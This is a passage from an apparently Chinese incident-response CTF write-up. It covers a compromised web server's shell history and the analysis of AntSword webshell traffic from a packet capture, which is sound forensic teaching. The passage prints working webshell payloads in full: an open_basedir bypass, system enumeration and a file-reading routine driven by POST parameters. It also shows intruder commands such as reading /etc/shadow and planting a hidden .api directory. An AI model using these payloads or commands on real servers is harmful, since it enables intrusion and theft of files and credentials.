class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> ww</span><br><span class="line">    <span class="built_in">cd</span> /home/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    mysql</span><br><span class="line">    yum install -y wget &amp;&amp; wget -O install.sh https://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484bec</span><br><span class="line">    BT</span><br><span class="line">    bt</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> /www/</span><br><span class="line">    <span class="built_in">cd</span> wwwroot/</span><br><span class="line">    <span class="built_in">cd</span> 127.0.0.1/</span><br><span class="line">    <span class="built_in">cd</span> wwwlogs/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cat</span> 127.0.0.1.<span class="built_in">log</span> </span><br><span class="line">    <span class="built_in">cd</span> nodejs/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> ..</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> tcp-error.log </span><br><span class="line">    <span class="built_in">cat</span> tcp-error.log </span><br><span class="line">    <span class="built_in">cat</span> nginx_error.log </span><br><span class="line">    <span class="built_in">cat</span> access.log </span><br><span class="line">    <span class="built_in">cat</span> 127.0.0.1.<span class="built_in">log</span> </span><br><span class="line">    <span class="built_in">cd</span> /www/</span><br><span class="line">    <span class="built_in">cd</span> wwwlogs/</span><br><span class="line">    <span class="built_in">cat</span> 127.0.0.1.<span class="built_in">log</span> </span><br><span class="line">    bt</span><br><span class="line">    <span class="built_in">cd</span> /www/wwwroot/</span><br><span class="line">    <span class="built_in">cd</span> 127.0.0.1/</span><br><span class="line">    <span class="built_in">rm</span> -rf flag1 1</span><br><span class="line">    <span class="built_in">rm</span> -rf version2.php </span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    hardlink </span><br><span class="line">    hwclock </span><br><span class="line">    docker ps</span><br><span class="line">    <span class="built_in">rm</span> -rf pe9.sql </span><br><span class="line">    <span class="built_in">cd</span> vendor/</span><br><span class="line">    <span class="built_in">cd</span> 127.0.0.1/</span><br><span class="line">    .api</span><br><span class="line">    <span class="built_in">mkdir</span> .api</span><br><span class="line">    <span class="built_in">cd</span> .api/</span><br><span class="line">    <span class="built_in">cd</span> api/</span><br><span class="line">    <span class="built_in">cp</span> * ../.api/</span><br><span class="line">    <span class="built_in">cd</span> .api/</span><br><span class="line">    vim mpnotify.php </span><br><span class="line">    vim  alinotify.php </span><br><span class="line">    <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">    <span class="built_in">who</span></span><br><span class="line">    w</span><br><span class="line">    <span class="built_in">history</span></span><br><span class="line">    useradd flag3&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br><span class="line">    <span class="built_in">env</span></span><br><span class="line">    <span class="variable">$flag3</span> = [root@web-server .api]<span class="comment"># useradd flag3&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span></span><br><span class="line">    useradd: invalid user name <span class="string">&#x27;flag3&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;&#x27;</span></span><br><span class="line">    <span class="variable">$flag3</span> = flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br><span class="line">    vim /etc/profile</span><br><span class="line">    <span class="built_in">source</span> /etc/p</span><br><span class="line">    <span class="built_in">source</span> /etc/profile</span><br><span class="line">    <span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>通过上面的敏感一些文件和命令可以发现一些<code>flag</code>哈哈哈.比如查看一下<code>.api</code>目录</p><mark class="tag-plugin colorful mark" color="red">题目的本意是提醒你别忘了看环境变量哦~~~</mark><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server ~]<span class="comment"># find / -name .api</span></span><br><span class="line">/www/wwwroot/127.0.0.1/.api</span><br><span class="line">[root@web-server ~]<span class="comment"># cat /www/wwwroot/127.0.0.1/.api/* | grep flag</span></span><br><span class="line"><span class="variable">$flag2</span> = <span class="string">&quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425446.png" data-fancybox="true"/></div></div><h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server /]<span class="comment"># cat /etc/passwd |grep -v &quot;nologin&quot;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br></pre></td></tr></table></figure><h3 id="分析开机自启程序"><a href="#分析开机自启程序" class="headerlink" title="分析开机自启程序"></a>分析开机自启程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/rc.d/rc*</span><br></pre></td></tr></table></figure><h3 id="查看计划或定时任务"><a href="#查看计划或定时任务" class="headerlink" title="查看计划或定时任务"></a>查看计划或定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /etc/cron.d/*</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/root</span><br></pre></td></tr></table></figure><h2 id="全流量包分析"><a href="#全流量包分析" class="headerlink" title="全流量包分析"></a>全流量包分析</h2><p>下载<code>数据包1.pcapng</code>,使用<code>Wireshark</code>分析.在过滤器中输入<code>http</code>随便选中一个流量右键—&gt;追踪流—&gt;<code>TCP流</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425103.png" data-fancybox="true"/></div></div><p>输入<code>0</code>回车从第一个包开始看</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425324.png" data-fancybox="true"/></div></div><p>发现是个很典型的蚁剑流量哈,接下来对<code>POST</code>请求体<code>URL</code>解码慢慢分析</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425890.png" data-fancybox="true"/></div></div><p>我们去<code>index.php</code>代码中看看能不能找的这个参数值并给他删掉</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426499.png" data-fancybox="true"/></div></div><p>发现啥也没有…</p><blockquote><p>在大型框架或内容管理系统（CMS）中，URL请求的处理方式与简单的文件名加参数不同。这些系统通常使用路由机制来管理URL请求，路由机制允许开发者将特定的URL模式映射到后端的处理函数或控制器上。这意味着，当你访问一个URL时，系统会根据预先定义的路由规则来决定执行哪个功能，而不是直接去查找对应的文件。路由可以由CMS本身的功能提供，也可以由外部框架的功能或注解等方式提供。因此，为了理解或修改URL请求的处理方式，我们需要查看CMS或框架中定义路由的地方，这些地方可能是配置文件、插件设置或特定的注解代码。通过这种方式，系统能够更灵活地响应不同的URL请求，并提供更复杂的逻辑处理。</p><p>路由的来源</p><ol><li><strong>CMS功能提供的路由</strong>：许多CMS，例如WordPress、Joomla等，内置了路由功能，可以通过插件或主题配置自定义路由。</li><li><strong>框架提供的路由</strong>：诸如Laravel、Symfony等PHP框架，通常包含强大的路由系统，允许开发者定义复杂的路由规则。</li><li><strong>注解提供的路由</strong>：一些框架支持通过注解的方式定义路由，这样路由规则可以直接写在控制器的注释中。</li></ol></blockquote><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426649.png" data-fancybox="true"/></div></div><p>可以发现一句话木马,然后去逐步分析请求体特征</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426779.png" data-fancybox="true"/></div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>); <span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本执行时间无限制</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>); <span class="comment">// 获取 open_basedir 配置</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本的目录</span></span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>); <span class="comment">// 解析 open_basedir 目录，以 ; 或 : 为分隔符</span></span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>()); <span class="comment">// 将当前目录和临时目录添加到数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果目录不可写，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.fd491f470fb7&quot;</span>; <span class="comment">// 创建一个临时目录路径</span></span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 尝试创建临时目录</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果临时目录不存在，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>); <span class="comment">// 获取临时目录的绝对路径</span></span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 切换到临时目录</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>); <span class="comment">// 将 open_basedir 设置为上一级目录</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分割目录路径，并遍历每个目录</span></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>); <span class="comment">// 逐级返回上一级目录</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>); <span class="comment">// 将 open_basedir 设置为根目录</span></span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 删除临时目录</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于编码输出</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于输出内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空并关闭输出缓冲区</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;4a0c&quot;</span> . <span class="string">&quot;dc70&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>); <span class="comment">// 输出编码后的内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;db6&quot;</span> . <span class="string">&quot;da5&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 开启输出缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本的目录</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]); <span class="comment">// 获取翻译后的路径（兼容性处理）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>; <span class="comment">// 初始化结果字符串</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">range</span>(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$R</span> .= <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>; <span class="comment">// 添加Windows盘符</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$R</span> .= <span class="string">&quot;/&quot;</span>; <span class="comment">// 添加根目录</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前用户信息</span></span><br><span class="line">    <span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;posix_getegid&quot;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$s</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>] : @<span class="title function_ invoke__">get_current_user</span>(); <span class="comment">// 获取当前用户名或POSIX用户名</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="title function_ invoke__">php_uname</span>(); <span class="comment">// 获取系统信息</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t<span class="subst">&#123;$s&#125;</span>&quot;</span>; <span class="comment">// 添加用户名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$R</span>; <span class="comment">// 输出结果</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(); <span class="comment">// 处理异常并输出错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>(); <span class="comment">// 调用输出函数</span></span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">// 结束脚本执行</span></span><br></pre></td></tr></table></figure><p>上面这个可能比较复杂,我们接着往下看,可以看到流11</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.b1e668&quot;</span>;@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;<span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);&#125;;@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="keyword">echo</span> <span class="string">&quot;b6&quot;</span>.<span class="string">&quot;887&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;f405&quot;</span>.<span class="string">&quot;72be7&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$F</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;x0b6b31b98f31d&quot;</span>],<span class="number">2</span>));<span class="variable">$P</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span>(@<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>)?<span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>):<span class="number">4096</span>));@<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>);;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();&amp;x0b6b31b98f31d=OmL3d3dy93d3dyb290LzEyNy4wLjAuMS9mbGFnMQ==</span><br></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>格式化</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>); <span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本执行时间无限制</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>); <span class="comment">// 获取 open_basedir 配置</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本的目录</span></span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>); <span class="comment">// 解析 open_basedir 目录，以 ; 或 : 为分隔符</span></span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>()); <span class="comment">// 将当前目录和临时目录添加到数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果目录不可写，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.b1e668&quot;</span>; <span class="comment">// 创建一个临时目录路径</span></span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 尝试创建临时目录</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果临时目录不存在，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>); <span class="comment">// 获取临时目录的绝对路径</span></span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 切换到临时目录</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>); <span class="comment">// 将 open_basedir 设置为上一级目录</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分割目录路径，并遍历每个目录</span></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>); <span class="comment">// 逐级返回上一级目录</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>); <span class="comment">// 将 open_basedir 设置为根目录</span></span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>); 